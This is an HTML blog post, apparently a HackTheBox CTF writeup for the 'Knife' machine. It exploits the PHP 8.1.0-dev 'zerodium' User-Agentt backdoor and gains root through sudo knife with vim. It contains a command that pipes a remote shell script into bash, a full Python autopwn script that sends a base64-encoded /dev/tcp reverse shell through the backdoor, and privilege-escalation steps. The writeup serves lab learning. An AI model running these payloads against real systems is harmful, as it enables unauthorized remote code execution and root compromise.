@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Knife Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Knife Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Knife Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Knife is a linux based machine that was active since May 22th of 2021 to August 28th, on this machine we will get code execution through a backdoor that was left on the PHP repository, and escalate privileges due to an executable that allows us to set our editor for editing files, so we set vim and spawn a shell." />
+<meta property="og:description" content="Knife is a linux based machine that was active since May 22th of 2021 to August 28th, on this machine we will get code execution through a backdoor that was left on the PHP repository, and escalate privileges due to an executable that allows us to set our editor for editing files, so we set vim and spawn a shell." />
+<link rel="canonical" href="http://localhost:8000/Knife" />
+<meta property="og:url" content="http://localhost:8000/Knife" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/knife/knife.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-28T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/knife/knife.png" />
+<meta property="twitter:title" content="Knife Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-08-28T00:00:00-05:00","datePublished":"2021-08-28T00:00:00-05:00","description":"Knife is a linux based machine that was active since May 22th of 2021 to August 28th, on this machine we will get code execution through a backdoor that was left on the PHP repository, and escalate privileges due to an executable that allows us to set our editor for editing files, so we set vim and spawn a shell.","headline":"Knife Writeup [HTB]","image":"http://localhost:8000/assets/images/knife/knife.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Knife"},"url":"http://localhost:8000/Knife"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/knife/knife.png/../banner.png>
+  
+  <h2>Knife Writeup [HTB]</h2>
+  <time datetime="2021-08-28T00:00:00-05:00" class="by-line">28 Aug 2021</time>
+  <p>Knife is a linux based machine that was active since May 22th of 2021 to August 28th, on this machine we will get code execution through a backdoor that was left on the PHP repository, and escalate privileges due to an executable that allows us to set our editor for editing files, so we set vim and spawn a shell.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.242
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.242
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Tue Jun  1 14:22:16 2021 -- 1 IP address (1 host up) scanned in 13.13 seconds</span>
+</code></pre></div></div>
+
+<p>We only find SSH and HTTP running, so we visite the webpage.</p>
+
+<p><img src="/assets/images/knife/website.png" alt="" /></p>
+
+<p>It looks like a site related to health, if we run <code class="language-plaintext highlighter-rouge">whatweb</code> we find something interesting.</p>
+
+<p><img src="/assets/images/knife/whatweb.png" alt="" /></p>
+
+<p>The site uses PHP 8.1.0-<strong>dev</strong>, why it would use a development version?</p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>If you were up to date with the news probably you heard about this, someone left a backdoor inside the PHP repository, <a href="https://unaaldia.hispasec.com/2021/03/detectada-una-puerta-trasera-en-el-repositorio-oficial-de-php.html">here</a> an article in spanish, so the backdoor works by adding the header “User-Agentt” (yes, with double “t”), and start with “zerodium”, after “zerodium” string everything will be executed by php, so we test to run id command.</p>
+
+<p><img src="/assets/images/knife/bdtest.png" alt="" /></p>
+
+<p>As we see we get back the output of the command, so we can execute a reverse shell command (we could also get the id_rsa key of james, but it’s password protected, and since the server is running under james there is no difference), so we start a http server with python, and serve a bash reverse shell) so we run <code class="language-plaintext highlighter-rouge">curl -s http://10.10.10.242/ -H 'User-Agentt: zerodiumsystem("curl 10.10.16.34:8000/shell.sh | bash");'</code>, and we get a shell as james and retrieve user.txt.</p>
+
+<p><img src="/assets/images/knife/shell.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Checking if we can execute anything with sudo we see that we can run knife as root.</p>
+
+<p><img src="/assets/images/knife/sudo.png" alt="" /></p>
+
+<p>We check the help of the command and something quickly calls our attetion, we can specify the editor that we want to use on certain commands.</p>
+
+<p><img src="/assets/images/knife/knifehelp.png" alt="" /></p>
+
+<p>There is also a <a href="https://docs.chef.io/workstation/knife/">link</a> to the documentation of the tool, then we run <code class="language-plaintext highlighter-rouge">sudo knife list</code> to see what we have available, we see /members.json, so let’s try to edit it and set vim as our editor, then we can execute a shell with vim and finish with the machine: <code class="language-plaintext highlighter-rouge">sudo knife edit /members.json -e vim</code>.</p>
+
+<p><img src="/assets/images/knife/root.png" alt="" /></p>
+
+<h1 id="autopwn"><a href="#header-1"></a>Autopwn</h1>
+
+<p>Since the machine was really short I decided to write an autopwn for it, it uses the backdoor to spawn a reverse shell, and uses vim to escalate the privileges.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">import</span> <span class="n">signal</span>
+<span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">time</span>
+<span class="kn">import</span> <span class="n">threading</span>
+
+<span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">fram</span><span class="p">):</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Exiting...</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">signal</span><span class="p">.</span><span class="nf">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">def_handler</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Print please provide the IP of the target machine and the local machine</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">print </span><span class="p">(</span><span class="sh">"</span><span class="s">Example usage: python3 autopwn.py 10.10.10.242 10.10.16.250</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">local</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">rev_shell</span> <span class="o">=</span> <span class="sh">'</span><span class="s">bash -i &gt;&amp; /dev/tcp/</span><span class="sh">'</span> <span class="o">+</span> <span class="n">local</span> <span class="o">+</span> <span class="sh">'</span><span class="s">/54321 0&gt;&amp;1</span><span class="sh">'</span>
+<span class="n">encoded</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64encode</span><span class="p">(</span><span class="n">rev_shell</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="nf">progress</span><span class="p">(</span><span class="sh">"</span><span class="s">Pwning</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">log_mess</span><span class="p">(</span><span class="n">mess</span><span class="p">):</span>
+    <span class="n">p1</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="n">mess</span><span class="p">)</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    
+<span class="k">def</span> <span class="nf">spawn_shell</span><span class="p">():</span>
+    <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://</span><span class="sh">"</span> <span class="o">+</span> <span class="n">ip</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="sh">'</span><span class="s">User-Agentt</span><span class="sh">'</span><span class="p">:</span> <span class="sa">f</span><span class="sh">'</span><span class="s">zerodiumsystem(</span><span class="sh">"</span><span class="s">echo -n </span><span class="si">{</span><span class="n">encoded</span><span class="si">}</span><span class="s">|base64 -d|bash</span><span class="sh">"</span><span class="s">);</span><span class="sh">'</span><span class="p">},</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
+    <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">ReadTimeout</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Executing reverse shell</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">spawn_shell</span><span class="p">).</span><span class="nf">start</span><span class="p">()</span>
+<span class="n">rem</span> <span class="o">=</span> <span class="nf">listen</span><span class="p">(</span><span class="mi">54321</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Getting user flag</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /home/james/user.txt </span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">User flag: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">)[</span><span class="mi">2</span><span class="p">])</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Escalating privileges</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">sudo knife edit /members.json -e vim</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">:set shell=/bin/bash</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">:shell</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">id</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">We are root: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+
+<span class="nf">log_mess</span><span class="p">(</span><span class="sh">"</span><span class="s">Getting root flag</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">cat /root/root.txt</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span> <span class="sh">"</span><span class="s">Root flag: </span><span class="sh">"</span> <span class="o">+</span> <span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+
+<span class="n">p1</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">"</span><span class="s">Machine owned!!</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sh">"</span><span class="s">script -qc /bin/bash /dev/null</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">interactive</span><span class="p">(</span><span class="n">prompt</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>
+<span class="n">rem</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/knife/autopwn.gif" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#php"> php</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
